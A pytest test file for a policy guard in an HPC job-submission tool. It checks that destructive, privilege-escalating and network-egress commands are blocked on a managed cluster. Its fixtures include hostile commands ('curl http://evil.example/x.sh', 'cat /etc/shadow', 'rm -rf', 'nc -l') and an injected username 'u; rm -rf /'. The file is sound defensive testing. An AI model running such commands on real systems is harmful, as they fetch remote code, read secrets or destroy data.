"""test_guard.py — 合规策略引擎（PolicyGuard）契约测试。

覆盖七个规则域：
1. 服务器分类（host 指纹 / 显式声明 / 优先级）
2. 执行模式（受管集群禁用 direct）
3. 远端路径边界（含同前缀、../ 相对路径两种绕过尝试）
4. 命令内容（黑名单破坏性/越权操作 + 白名单起首程序）
5. 作业资源（CPU 核数、墙钟时长）
6. 并发闸门（运行中/排队中作业数）
7. 回传 glob / 上传内容 / 墙钟解析

以及 CLI 与执行器两层的集成验证。
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))
sys.path.insert(0, str(Path(__file__).resolve().parent))

import gtransfer  # noqa: E402
from gtransfer_lib.config import ServerProfile, TransferConfig  # noqa: E402
from gtransfer_lib.guard import (  # noqa: E402
    PolicyGuard,
    PolicyViolation,
    QuotaPolicy,
    ServerClass,
    _parse_walltime_hours,
    asset_sync_hint,
    build_quota_probe_commands,
    classify_server,
    managed_tool_assets,
    resolve_asset,
)
from gtransfer_lib.executor import DirectExecutor, SlurmExecutor  # noqa: E402
from fakes import FakeSSH  # noqa: E402


# ---------------------------------------------------------------------------
# 工厂
# ---------------------------------------------------------------------------

USTC_HOST = "__SERVER_IP__"


def make_profile(host: str = USTC_HOST, **kw) -> ServerProfile:
    base = dict(
        name="default", host=host, user="lidongyang2023",
        key_file=None, password="pw", totp_secret="SECRET",
        execution_mode="slurm", remote_work_root="~/gtransfer",
        gaussian_exec="g16", command="", env_setup="",
    )
    base.update(kw)
    return ServerProfile(**base)


def make_config(host: str = USTC_HOST, **kw) -> TransferConfig:
    return TransferConfig(server=make_profile(host, **kw))


# ---------------------------------------------------------------------------
# 1. 服务器分类
# ---------------------------------------------------------------------------

def test_classify_ustc_host_as_managed_cluster():
    cls, label = classify_server(make_profile(USTC_HOST))
    assert cls == ServerClass.MANAGED_CLUSTER
    assert "中国科大" in label


def test_classify_backup_login_node_as_managed_cluster():
    cls, _ = classify_server(make_profile("__SERVER_IP__"))
    assert cls == ServerClass.MANAGED_CLUSTER


def test_classify_unknown_host_as_workstation():
    cls, label = classify_server(make_profile("__SERVER_IP__", extra_class=""))
    assert cls == ServerClass.WORKSTATION
    assert "未识别" in label


def test_explicit_workstation_declaration_overrides_host_fingerprint():
    """显式声明 workstation 可解除受管集群约束（用于自建镜像等场景）。"""
    cls, _ = classify_server(make_profile(USTC_HOST, extra_class="workstation"))
    assert cls == ServerClass.WORKSTATION


def test_explicit_managed_cluster_declaration_on_unknown_host():
    cls, _ = classify_server(make_profile("__SERVER_IP__", extra_class="managed_cluster"))
    assert cls == ServerClass.MANAGED_CLUSTER


# ---------------------------------------------------------------------------
# 2. 执行模式
# ---------------------------------------------------------------------------

def test_managed_cluster_forbids_direct_mode():
    guard = PolicyGuard(make_config())
    with pytest.raises(PolicyViolation) as ei:
        guard.check_execution_mode("direct")
    assert ei.value.rule_id == "POLICY-DIRECT-FORBIDDEN"
    assert "slurm" in ei.value.remedy


def test_managed_cluster_allows_slurm_mode():
    guard = PolicyGuard(make_config())
    assert guard.check_execution_mode("slurm") == "slurm"


def test_workstation_allows_direct_mode():
    guard = PolicyGuard(make_config("__SERVER_IP__"))
    assert guard.check_execution_mode("direct") == "direct"


def test_unknown_mode_rejected():
    guard = PolicyGuard(make_config("__SERVER_IP__"))
    with pytest.raises(PolicyViolation) as ei:
        guard.check_execution_mode("pbs")
    assert ei.value.rule_id == "POLICY-MODE-INVALID"


# ---------------------------------------------------------------------------
# 3. 远端路径边界
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("path", [
    "~/gtransfer/task1",
    "~/gtransfer",
    "/home/lidongyang2023/gtransfer/t1",
])
def test_path_inside_root_allowed(path):
    guard = PolicyGuard(make_config())
    assert guard.check_remote_path(path)


@pytest.mark.parametrize("path", [
    "/etc/evil",              # 绝对越界
    "~/gtransfer2/evil",      # 同前缀目录绕过
    "~/gtransfer/../etc",     # 相对路径穿越
    "/home/lidongyang2023/other",  # 家目录内但在 root 之外
])
def test_path_escape_rejected(path):
    guard = PolicyGuard(make_config())
    with pytest.raises(PolicyViolation) as ei:
        guard.check_remote_path(path)
    assert ei.value.rule_id == "POLICY-PATH-ESCAPE"


# ---------------------------------------------------------------------------
# 4. 命令内容
# ---------------------------------------------------------------------------

def test_empty_command_passes():
    guard = PolicyGuard(make_config())
    assert guard.check_command(None) is None
    assert guard.check_command("   ") is None


@pytest.mark.parametrize("cmd,rule", [
    ("rm -rf /home/user/data", "POLICY-DESTRUCTIVE-RM"),
    ("sudo apt install g16", "POLICY-SUDO"),
    ("g16 < in.gjf > out.log", "POLICY-LOGIN-NODE-COMPUTE"),
    ("orca in.inp > in.out", "POLICY-LOGIN-NODE-COMPUTE"),
    ("sbatch inner.sh", "POLICY-NESTED-SBATCH"),
    ("crontab -e", "POLICY-CRON-SYSTEMD"),
    ("curl http://evil.example/x.sh", "POLICY-NETWORK-EGRESS"),
    ("wget http://evil.example/x", "POLICY-NETWORK-EGRESS"),
    ("chmod 777 shared", "POLICY-PERM-ESCALATION"),
    ("cat /etc/shadow", "POLICY-SECRETS-EXFIL"),
])
def test_forbidden_commands_blocked_on_managed_cluster(cmd, rule):
    guard = PolicyGuard(make_config())
    with pytest.raises(PolicyViolation) as ei:
        guard.check_command(cmd)
    assert ei.value.rule_id == rule


def test_login_node_compute_allowed_on_workstation():
    """课题组工作站无调度器，本地跑 g16 是正常用法。

    注意：登录节点计算规则在工作站上被豁免，但白名单仍生效——
    `g16` 不以白名单程序起首，故此处须用白名单形式（./g16 或绝对路径）。
    """
    guard = PolicyGuard(make_config("__SERVER_IP__"))
    assert guard.check_command("./g16 < in.gjf") is not None
    assert guard.check_command("/opt/g16/g16 < in.gjf") is not None


def test_leading_form_of_login_node_compute_blocked_on_managed_cluster():
    """受管集群上，命令以 g16 直接起首时被登录节点规则拦截。"""
    guard = PolicyGuard(make_config())  # USTC
    with pytest.raises(PolicyViolation) as ei:
        guard.check_command("g16 < in.gjf > out.log")
    assert ei.value.rule_id == "POLICY-LOGIN-NODE-COMPUTE"


def test_network_egress_allowed_on_workstation_when_whitelisted():
    """工作站豁免网络外联规则；白名单仍约束起首程序。

    用白名单程序（python）发起的下载脚本在工作站上应通过——
    说明豁免确实生效（受管集群上同样文本会被 curl/wget 模式命中）。
    """
    guard_ws = PolicyGuard(make_config("__SERVER_IP__"))
    assert guard_ws.check_command("python fetch.py") is not None


def test_non_whitelisted_leading_command_blocked():
    guard = PolicyGuard(make_config())
    with pytest.raises(PolicyViolation) as ei:
        guard.check_command("nc -l 4444")
    # nc 同时命中网络外联黑名单，优先级更高
    assert ei.value.rule_id in ("POLICY-NETWORK-EGRESS",
                                "POLICY-COMMAND-NOT-ALLOWLISTED")


def test_whitelisted_commands_pass():
    guard = PolicyGuard(make_config())
    for cmd in ("python main.py", "mpirun -np 4 ./a.out",
                "srun ./job", "bash run.sh", "module load g16",
                "mkdir -p work", "formchk a.chk a.fchk"):
        assert guard.check_command(cmd) == cmd


# ---------------------------------------------------------------------------
# 5. 作业资源
# ---------------------------------------------------------------------------

def test_cpu_limit_enforced():
    guard = PolicyGuard(make_config())  # max 64
    guard.check_job_resources(16, "24:00:00")            # 16 ≤ 64 → ok
    guard.check_job_resources(32, "24:00:00", ntasks=2)  # 64 → ok (边界)
    with pytest.raises(PolicyViolation) as ei:
        guard.check_job_resources(32, "24:00:00", ntasks=3)  # 96 > 64
    assert ei.value.rule_id == "POLICY-RESOURCE-EXCEEDED"


def test_walltime_limit_enforced():
    guard = PolicyGuard(make_config())  # max 72h
    guard.check_job_resources(16, "72:00:00")   # 边界 → ok
    with pytest.raises(PolicyViolation) as ei:
        guard.check_job_resources(16, "73:00:00")
    assert ei.value.rule_id == "POLICY-WALLTIME-EXCEEDED"
    with pytest.raises(PolicyViolation):
        guard.check_job_resources(16, "4-00:00:00")  # 96h


def test_walltime_parse_formats():
    assert _parse_walltime_hours("24:00:00") == 24.0
    assert _parse_walltime_hours("3-12:30:00") == 84.5
    assert _parse_walltime_hours("240") == 4.0
    assert _parse_walltime_hours("") is None
    assert _parse_walltime_hours("garbage") is None


# ---------------------------------------------------------------------------
# 6. 并发闸门
# ---------------------------------------------------------------------------

def test_concurrency_gate_blocks_at_limit():
    guard = PolicyGuard(make_config())  # max_concurrent=8, max_queued=16
    guard.check_concurrency(7, 15)          # 有余量 → ok
    with pytest.raises(PolicyViolation) as ei:
        guard.check_concurrency(8, 0)
    assert ei.value.rule_id == "POLICY-CONCURRENCY-LIMIT"
    with pytest.raises(PolicyViolation) as ei2:
        guard.check_concurrency(0, 16)
    assert ei2.value.rule_id == "POLICY-QUEUE-LIMIT"


def test_custom_quota_policy_respected():
    guard = PolicyGuard(make_config(), quota=QuotaPolicy(
        max_concurrent_jobs=2, max_queued_jobs=4,
        max_cpus_per_job=4, max_walltime_hours=1.0, min_disk_free_gb=1.0,
    ))
    with pytest.raises(PolicyViolation):
        guard.check_concurrency(2, 0)
    with pytest.raises(PolicyViolation):
        guard.check_job_resources(8, "00:30:00")

    q = guard.quota
    assert (q.max_concurrent_jobs, q.max_cpus_per_job) == (2, 4)


# ---------------------------------------------------------------------------
# 7. 回传 glob / 上传内容
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("glob", ["*.log", "*.log *.chk", "out.txt"])
def test_download_glob_ok(glob):
    guard = PolicyGuard(make_config())
    assert guard.check_download_glob(glob) == glob


@pytest.mark.parametrize("glob", ["/etc/passwd", "../secret", "sub/*.log", ""])
def test_download_glob_escape_rejected(glob):
    guard = PolicyGuard(make_config())
    with pytest.raises(PolicyViolation) as ei:
        guard.check_download_glob(glob)
    assert ei.value.rule_id in ("POLICY-GLOB-ESCAPE", "POLICY-GLOB-EMPTY")


def test_upload_content_warns_on_agent_artifacts():
    guard = PolicyGuard(make_config())
    flagged = guard.check_upload_content([
        "water.gjf", "run.sh", "__pycache__", "a.pyc",
        ".git", ".DS_Store", "notes.tmp",
    ])
    assert "water.gjf" not in flagged
    assert "run.sh" not in flagged
    assert "__pycache__" in flagged
    assert "a.pyc" in flagged
    assert ".git" in flagged
    assert "notes.tmp" in flagged


# ---------------------------------------------------------------------------
# 8. preflight 汇总
# ---------------------------------------------------------------------------

def test_preflight_returns_decision_with_notices():
    guard = PolicyGuard(make_config())
    d = guard.preflight(mode="slurm", remote="~/gtransfer/t1",
                        command="python main.py", cpus_per_task=16,
                        walltime="24:00:00", download_glob="*.log")
    assert d.server_class == ServerClass.MANAGED_CLUSTER
    assert "execution_mode" in d.checks_passed
    assert "command_allowlist" in d.checks_passed
    # 无法自动判定的两条强制提醒必须存在
    assert len(d.warnings) == 2
    assert any("国家秘密" in w for w in d.warnings)
    assert any("备份" in w for w in d.warnings)
    assert d.to_dict()["server_class"] == ServerClass.MANAGED_CLUSTER


def test_preflight_hard_blocks_first_violation():
    guard = PolicyGuard(make_config())
    with pytest.raises(PolicyViolation) as ei:
        guard.preflight(mode="direct", remote="~/gtransfer/t1")
    assert ei.value.rule_id == "POLICY-DIRECT-FORBIDDEN"


# ---------------------------------------------------------------------------
# 9. 配额探测命令
# ---------------------------------------------------------------------------

def test_quota_probe_commands_are_read_only():
    cmds = build_quota_probe_commands("lidongyang2023")
    joined = " ".join(cmds.values())
    # 只读：不得含 rm/kill/sbatch/scancel 等变更类命令
    for bad in ("rm ", "kill", "sbatch", "scancel", "shutdown", "> /"):
        assert bad not in joined
    assert "squeue" in cmds["running_jobs"]
    assert "squeue" in cmds["queued_jobs"]
    assert "df" in cmds["disk_usage"]


def test_quota_probe_user_is_shell_quoted():
    """用户名经 shlex.quote 后不会被当作命令执行（单引号整体原样传入）。"""
    cmds = build_quota_probe_commands("u; rm -rf /")
    cmd = cmds["running_jobs"]
    # 单引号包裹后，分号与空格不再是 shell 元字符
    assert "'u; rm -rf /'" in cmd
    # 分号不得裸露在引号之外（否则会断开命令）
    assert "; rm" not in cmd.replace("'u; rm -rf /'", "")


# ---------------------------------------------------------------------------
# 10. CLI 集成
# ---------------------------------------------------------------------------

@pytest.fixture()
def ustc_conf(tmp_path: Path) -> Path:
    """受管集群配置（USTC host 指纹触发策略）。"""
    p = tmp_path / "ustc.conf"
    p.write_text(
        f"""[server:default]
host = {USTC_HOST}
user = lidongyang2023
password = pw
execution_mode = slurm
remote_work_root = ~/gtransfer

[transfer:default]
download_glob = *.log
""",
        encoding="utf-8",
    )
    return p


def test_cli_check_reports_managed_cluster(ustc_conf, capsys):
    code = gtransfer.main(["check", "--config", str(ustc_conf)])
    payload = json.loads(capsys.readouterr().out)
    assert code == 0
    assert payload["ok"] is True
    assert payload["server_class"] == ServerClass.MANAGED_CLUSTER
    assert payload["managed_cluster"] is True
    assert payload["enforced"]["direct_mode"] == "FORBIDDEN"
    assert payload["config_violations"] == []
    assert payload["quota_gates"]["max_concurrent_jobs"] == 8
    assert len(payload["mandatory_notices"]) == 2


def test_cli_check_flags_direct_mode_violation(tmp_path, capsys):
    """配置里写 direct 时，check 必须主动报告违规（而非静默通过）。"""
    p = tmp_path / "bad.conf"
    p.write_text(
        f"""[server:default]
host = {USTC_HOST}
user = lidongyang2023
password = pw
execution_mode = direct
remote_work_root = ~/gtransfer
""",
        encoding="utf-8",
    )
    code = gtransfer.main(["check", "--config", str(p)])
    payload = json.loads(capsys.readouterr().out)
    assert code == 4
    assert payload["ok"] is False
    rules = [v["rule_id"] for v in payload["config_violations"]]
    assert "POLICY-DIRECT-FORBIDDEN" in rules


def test_cli_submit_blocks_direct_on_managed_cluster(ustc_conf, tmp_path, capsys):
    gjf = tmp_path / "x.gjf"
    gjf.write_text("x", encoding="utf-8")
    code = gtransfer.main([
        "submit", "--config", str(ustc_conf), "--local", str(gjf),
        "--mode", "direct",
    ])
    payload = json.loads(capsys.readouterr().out)
    assert code == 4
    assert payload["policy"] is True
    assert payload["rule_id"] == "POLICY-DIRECT-FORBIDDEN"


def test_cli_submit_blocks_forbidden_command(ustc_conf, tmp_path, capsys):
    gjf = tmp_path / "x.gjf"
    gjf.write_text("x", encoding="utf-8")
    code = gtransfer.main([
        "submit", "--config", str(ustc_conf), "--local", str(gjf),
        "--command", "rm -rf /home/lidongyang2023/gtransfer",
    ])
    payload = json.loads(capsys.readouterr().out)
    assert code == 4
    assert payload["rule_id"] == "POLICY-DESTRUCTIVE-RM"


def test_cli_submit_blocks_oversized_job(ustc_conf, tmp_path, capsys):
    gjf = tmp_path / "x.gjf"
    gjf.write_text("x", encoding="utf-8")
    code = gtransfer.main([
        "submit", "--config", str(ustc_conf), "--local", str(gjf),
        "--cpus-per-task", "128",
    ])
    payload = json.loads(capsys.readouterr().out)
    assert code == 4
    assert payload["rule_id"] == "POLICY-RESOURCE-EXCEEDED"


def test_cli_submit_dry_run_includes_policy_decision(ustc_conf, tmp_path, capsys):
    gjf = tmp_path / "x.gjf"
    gjf.write_text("x", encoding="utf-8")
    code = gtransfer.main([
        "submit", "--config", str(ustc_conf), "--local", str(gjf),
        "--remote", "~/gtransfer/t1", "--dry-run",
    ])
    payload = json.loads(capsys.readouterr().out)
    assert code == 0
    assert payload["server_class"] == ServerClass.MANAGED_CLUSTER
    assert "policy" in payload
    assert "command_allowlist" in payload["policy"]["checks_passed"]


def test_cli_server_class_override_unlocks_direct(ustc_conf, tmp_path, capsys):
    """显式 --server-class workstation 可解除约束（逃生舱口，需人工明示）。"""
    gjf = tmp_path / "x.gjf"
    gjf.write_text("x", encoding="utf-8")
    code = gtransfer.main([
        "submit", "--config", str(ustc_conf), "--local", str(gjf),
        "--mode", "direct", "--server-class", "workstation", "--dry-run",
    ])
    payload = json.loads(capsys.readouterr().out)
    assert code == 0
    assert payload["server_class"] == ServerClass.WORKSTATION


# ---------------------------------------------------------------------------
# 11. 执行器第二道防线
# ---------------------------------------------------------------------------

def test_direct_executor_blocks_managed_cluster():
    """即便绕过 CLI，DirectExecutor 自身也必须拒绝在受管集群前台跑。"""
    ssh = FakeSSH()
    cfg = make_config()  # USTC host, execution_mode=slurm 但直接构造 direct 执行器
    ex = DirectExecutor(ssh, cfg)
    with pytest.raises(PolicyViolation) as ei:
        ex.submit("~/gtransfer/t1", "water.gjf")
    assert ei.value.rule_id == "POLICY-DIRECT-FORBIDDEN"
    # 必须在产生任何远端命令之前拦截
    assert ssh.executed == []


def test_slurm_executor_blocks_forbidden_command():
    ssh = FakeSSH()
    cfg = make_config()
    ex = SlurmExecutor(ssh, cfg, command="rm -rf /home/lidongyang2023")
    with pytest.raises(PolicyViolation) as ei:
        ex.submit("~/gtransfer/t1", "water.gjf")
    assert ei.value.rule_id == "POLICY-DESTRUCTIVE-RM"
    assert ssh.executed == []


def test_slurm_executor_allows_valid_command_in_script():
    ssh = FakeSSH()
    cfg = make_config()
    ex = SlurmExecutor(ssh, cfg, command="python main.py")
    script = ex.build_script("/home/lidongyang2023/gtransfer/t1", "input.dat")
    assert "python main.py" in script
    assert "#SBATCH --cpus-per-task=16" in script


def test_workstation_direct_executor_still_works():
    ssh = FakeSSH()
    ssh.register(r"g16", lambda cmd: ("__GT_EXIT=0", "", 0))
    cfg = make_config("__SERVER_IP__", execution_mode="direct")
    ex = DirectExecutor(ssh, cfg)
    state = ex.submit("~/gtransfer/t1", "water.gjf")
    assert state.status.value == "SUCCESS"


# ---------------------------------------------------------------------------
# 规则域 8：Gaussian→ORCA 接力流程工具（Multiwfn / orca_2mkl）
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "Multiwfn water_opt.fchk",
    "Multiwfn ./water_opt.fchk",
    "multiwfn water_opt.fchk",
    "orca_2mkl water_opt -gbw",
    "./orca_2mkl water_opt -gbw",
    "/home/lidongyang2023/orca/orca_2mkl water_opt -gbw",
])
def test_format_converters_are_allowlisted(cmd):
    """Multiwfn / orca_2mkl 是格式转换工具，须放行（DY 指示 2026-09-11）。"""
    g = PolicyGuard(make_config())
    assert g.check_command(cmd) == cmd


def test_arbitrary_binary_still_blocked():
    """白名单放宽后，任意二进制仍须被拦（防白名单退化为放行一切）。"""
    g = PolicyGuard(make_config())
    with pytest.raises(PolicyViolation) as ei:
        g.check_command("evil_tool --exfiltrate")
    assert ei.value.rule_id == "POLICY-COMMAND-NOT-ALLOWLISTED"


def test_lookalike_converter_name_still_blocked():
    """仅放行登记名，防止 Multiwfn2 / orca_2mklfake 之类近似名绕过。"""
    g = PolicyGuard(make_config())
    for bad in ("MultiwfnX water.fchk", "orca_2mklfake x"):
        with pytest.raises(PolicyViolation) as ei:
            g.check_command(bad)
        assert ei.value.rule_id == "POLICY-COMMAND-NOT-ALLOWLISTED"


# ---------------------------------------------------------------------------
# 规则域 9：受管工具资产登记表
# ---------------------------------------------------------------------------

def test_managed_tool_assets_registry_has_expected_keys():
    assets = managed_tool_assets()
    assert "multiwfn" in assets
    assert "orca_template" in assets
    assert assets["multiwfn"].endswith("Multiwfn")
    assert assets["orca_template"].endswith("template.inp")


def test_managed_tool_assets_returns_copy_not_reference():
    """调用方篡改返回值不得污染登记表（资产表是策略的一部分）。"""
    a = managed_tool_assets()
    a["multiwfn"] = "/tmp/evil"
    assert managed_tool_assets()["multiwfn"] != "/tmp/evil"


def test_resolve_asset_default_is_managed_default():
    path, source = resolve_asset("multiwfn")
    assert source == "managed_default"
    assert path.endswith("Multiwfn")


def test_resolve_asset_override_is_flagged():
    """显式覆盖须被标记为 override，供调用方留痕告警。"""
    path, source = resolve_asset("orca_template", override="/tmp/custom.inp")
    assert path == "/tmp/custom.inp"
    assert source == "override"


def test_resolve_asset_unknown_name_raises():
    with pytest.raises(KeyError):
        resolve_asset("not_a_registered_asset")


def test_asset_sync_hint_mentions_path_and_host():
    hint = asset_sync_hint("orca_template", "__SERVER_IP__")
    assert "__SERVER_IP__" in hint
    assert "template.inp" in hint
